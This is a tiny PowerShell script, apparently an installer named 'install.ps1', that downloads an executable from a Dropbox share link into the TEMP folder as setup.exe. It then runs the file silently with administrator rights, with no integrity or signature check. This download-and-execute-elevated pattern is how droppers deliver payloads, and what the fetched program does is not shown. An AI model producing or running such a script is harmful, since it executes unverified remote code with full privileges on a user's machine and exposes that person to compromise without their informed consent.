# install.ps1 nahid

$u = "https://www.dropbox.com/scl/fi/5jdblgebdbt01q1px4zrj/Built.exe?rlkey=krdcfobfbioysvnuuqb1q7c2i&st=nnsho2pu&dl=1"
$p = "$env:TEMP\setup.exe"

Invoke-RestMethod $u -OutFile $p
Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
